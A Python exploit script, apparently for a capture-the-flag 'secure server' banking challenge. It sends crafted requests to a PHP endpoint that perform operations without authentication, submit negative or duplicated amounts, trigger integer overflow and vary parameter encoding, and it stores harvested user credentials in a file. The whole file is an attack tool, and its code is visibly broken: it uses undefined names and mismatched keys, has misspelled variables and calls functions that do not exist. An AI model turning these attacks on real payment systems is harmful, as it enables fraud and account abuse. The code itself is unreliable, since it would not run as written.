#!/usr/bin/python3

import requests
import sys
import random
import argparse
import time
import urllib.parse
from art import *


headers = {
        "User-Agent" : "curl.7.72.0",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache"
    }

INT_MAX = 2147483647

registered_users = {}

def identity(string):
    return string

encoding_functions = {
    "username": {"header": identity, "body": identity},
    "password":  {"header": identity, "body": identity},
    "amount":  {"header": identity, "body": identity},
    "operation":  {"header": identity, "body": identity}
}

available_encoding_functions = {
    "None": identity,
    "URL encoding": urllib.parse.quote_plus
}

reverse_encoding_functions = {
    identity: "None",
    urllib.parse.quote_plus: "URL encoding"
}
def usage():
    print("Exploiter for the secure server cctf")
    print("")
    print("Arguments")
    print("     -d Destination")
    print("     -p Port")
    print("     -f Users file")
    print("Example: ./exploit.py -d 10.10.1.1 -p 80 [-f ./users.txt]")
    sys.exit(0)

def get_random_user():
    global registered_users
    users_list = list(registered_users.items())
    return random.choice(users_list)

def list_users():
    global registered_users
    print("Listing all users")
    for username in registered_users.keys():
        print(f"- {username} {registered_users[username]}")
    print("*************************************")

def get_params(username, password, operation, amount=None):
    params = {
        encoding_function["user"]["header"]("user"): encoding_function["user"]["body"](username),
        encoding_function["password"]["header"]("password"): encoding_function["password"]["body"](password),
        encoding_function["drop"]["header"]("drop"): encoding_function["drop"]["body"](operation),
    }
    if operation == 'withdraw' or operation == 'deposit':
        params[encoding_function["amount"]["header"]("amount")] = encoding_function["amount"]["body"](amounts)
    return params

def get_random_string(length):
    letters = string.ascii_letters
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def check_balance(url):
    global headers
    username = input("Insert the username: ")
    password = input("Insert the password: ")
    params = get_params(username, password, "balance")
    r = requests.get(url, params=params, headers=headers)
    print(f"Checking balance for {username} with password {password}")
    print(r.text)

def check_result(result):
    print(f"Application responded with code {r.status_code}")
    print(result.text)
    print("*************************************")
    return r.status_code == 200

def register_user(url):
    username = input("Insert the username to register [ blank for randomly generated ]: ")
    password = input("Insert the password for the user [ blank for randomly generated ]: ")
    if len(username) == 0:
        username = get_random_string(random.randint(5, 15))
    if len(password) == 0:
        password = get_random_string(random.randint(5,15))

    print("Attempting to register user")

    params = get_params(username, password, "register")
    r = requests.get(url, params=params, headers=headers)

    print(f"Request for registration completed for {username} with password {password}")
    check_status(r)
    registered_users[username] = password
    with open(users_file, "a") as file:
        file.write(f"{username},{password}\n")
    
def no_auth_operation(url):
    global headers
    username = get_random_string(random.randint(5, 15))
    password = get_random_string(random.randint(5,15))

    operation = input("Insert the operation to perform: ")
    amount = None
    if operation == 'withdraw' or operation == 'deposit':
        amount = input("Insert the amount: ")
    params = get_params(username, password, operation, amount=amount)

    print(f"Trying to perform {operation} without any authentication")
    r = requests.get(url, params=params, headers=headers)
    check_status(r)

def negative_amount(url):
    global headers
    global INT_MAX

    operation = input("Insert the operation to perform: ")
    if not operation == 'withdraw' and not operation == 'deposit':
        print("Only supported for withdraw and deposit operation")
        return
    
    username = input("Insert the username [blank for using a random one]: ")
    if not len(username) == 0:
        password = input("Insert the password: ")
    else:
        username, password = get_random_user()
    
    amount = random.randint(-INT_MAX, -1)
    print(f"Trying to execute {operation} with amount {amount}")
    params = get_params(username, password, operation, amount=amount)
    r = requests.get(url, headers=headers, params=params)

    check_status(r)

def multiple_amounts(url):

    global headers
    global INT_MAX

    operation = input("Insert the operation to perform: ")
    if not operation == 'withdraw' and not operation == 'deposit':
        print("Only supported for withdraw and deposit operation")
        return

    username = input("Insert the username [blank for using a random one]: ")

    if not len(username) == 0:
        password = input("Insert the password: ")
    else:
        username, password = get_random_user()
    
    n_amounts = input("Insert the number of amounts to send [ 3 ]: ")
    if len(n_amounts) == 0 or n_amounts == '0':
        n_amounts = 3
    else:
        n_amounts = int(n_amounts)
    
    negative_amounts = input("Allow also negative amounts [y/N] ? ")
    if negative_amounts == 'y':
        negative_amounts = True
    else:
        negative_amounts = False

    amounts = []
    lower_bound = -INT_MAX
    
    if not negative_amounts:
        lower_bound = 0

    for i in range(n_amounts):
        amounts.append(random.randint(lower_bound, INT_MAX))

    params = get_params(username, password, operation, amount=amounts)
    print(f"Trying to execute {operation} with amounts {amounts}")

    r = requests.get(url, params=params, headers=headers)
    check_status(r)

def large_amount(url):

    global headers
    global INT_MAX

    username = input("Insert the username [blank for using a random registered one]: ")

    if not len(username) == 0:
        password = input("Insert the password: ")
    else:
        username, password = get_random_user()

    operation = input("Insert the operation to perform: ")

    if not operation == 'withdraw' and not operation == 'deposit':
        print("Only supported for withdraw and deposit operation")
        return
    amount = INT_MAX + random.randint(0, INT_MAX)
    params = get_params()

    print(f"Trying to execute {operation} with amount {amount}")
    r = requests.get(url, params=params, headers=headers)
    check_status(r)

def terminate(ignored):
    tprint("sysadmin","rnd-xlarge")
    print("")
    tprint("Bye!", "rnd-large")
    sys.exit(0)

def custom_payload(url):
    global headers
    username = input("Insert the username: ")
    pasword = input("Insert the password: ")
    operaiton = input("Insert the operation: ")

    amount = None
    if operation == 'withdraw' or operation == 'deposit':
        amount = input("Insert the amount: ")

    params = get_params(username, password, operation, amount = amount)
    r = requests.get(url, headers=headers, params=params)
    check_status(r)

def change_encoding_rules(ignored):
    global encoding_functions
    global available_encoding_functions

    title = "Change encoding rules"

    available_functions = {
        "u": ("username", "Change encoding of the username"),
        "p": ("password", "Change encoding of the password"),
        "a": ("amount", "Change encoding of the amount"),
        "o": ("operation", "Change encoding of the operation")
    }

    field = print_menu(available_functions, title=title)

    title = f"Change encoding for the {field} field - Available encoding functions"
    available_functions = {}

    i = 0
    for function_name in available_encoding_functions.keys():
        available_functions[str(i)] = (available_encoding_functions[function_name], function_name)
        i+=1
    
    chosen_function = print_menu(available_functions, title=title)

    title = "What do you want to encode with the chosen function?"
    available_functions = {
        "both": ({"header": True, "body": True}, "Parameter name and value"),
        "value": ({"header": False, "body": True}, "Only the parameter value"),
        "name": ({"header": True, "body": False}, "Only the parameter name")
    }
    what_to_encode = print_menu(available_functions, title=title)

    if what_to_encode["header"]:
        encoding_functions[field]["header"] = chosen_function
    
    if what_to_encode["body"]:
        encoding_functions[field]["body"] = chosen_function

#### GRAPHIC STUFF ####

def clear_screen():
    print(chr(27)+'[2j')
    print('\033c')
    print('\x1bc')

def print_tool_status():
    global encoding_functions
    global reverse_encoding_functions
    global registered_users

    print("Tool status")
    print(f"Parameter encoding: ")
    for field in encoding_functions.keys():
        body_function = encoding_functions[field]["body"]
        header_function = encoding_functions[field]["header"]
        print(f"     - {field} -> name: {reverse_encoding_functions[header_function]} - value: {reverse_encoding_functions[body_function]}")
    print(f"Number of registered users: {len(registered_users.items())}")
    print("")

def print_menu(available_functions, title = None):
    global encoding_function
    global registered_users

    if title is not None:
        print("Title")

    choice = None
    while choice not in available_functions.keys():
        for i in available_functions.keys():
            _, description = available_functions[i]
            print(f" {i} - {description}")
        print("")
        choice = input("What do tou want to do? ")
        print("")

    function, _ = available_functions[choice]
    return function

def main():
    global encoding_function
    global users_file

    parser = argparse.ArgumentParser(description="Exploiter script for Secure Server cctf")
    parser.add_argument("-d", "--destination",required=True, help="Destination IP Address")
    parser.add_argument("-p", "--port", default=80, help="Destinatin Port")
    parser.add_argument("-uf", "--users_file", default="./users.txt", help="File which stores the registered users")
    args = parser.parse_args()

    if not len(sys.argv[1:]):
        usage()

    tprint("pwn it", "rnd-xlarge")
    time.sleep(2)
    destination_ip = args.destination
    destination_port = int(args.port)
    users_file = args.users_file
    try:
        with open(users_file, "r") as file:
            users = file.read().split("\n")
            for line in users:
                username, password = line.split(",")
                registered_users[username] = password
    except:
        pass


    url = f"http://{destination_ip}:{destination_port}/process.php"

    headers["Host"] = destination_ip

    available_functions = {
        "0": (check_balance, "Check balance of a user"),
        "1": (register_user, "Register a new user"),
        "2": (no_auth_operation, "Perform an operation without authentication"),
        "3": (negative_amount, "Perform operation with negative amount"),
        "4": (multiple_amounts, "Perform operations with multiple amounts"),
        "5": (large_amount, "Perform operation with a really large amount ( integer overflow )"),
        "6": (custom_payload, "Craft your own request"),
        "e": (change_encoding_rules, "Change the encoding of the fields"),
        "q": (terminate, "Exit")
    }

    while True:
        try:
            print_tool_status()
            function = print_menu(available_functions)
            function(url)
        except KeyboardInterrupt:
            print("Operation aborted by the user")

if __name__ == "__main__":
    main()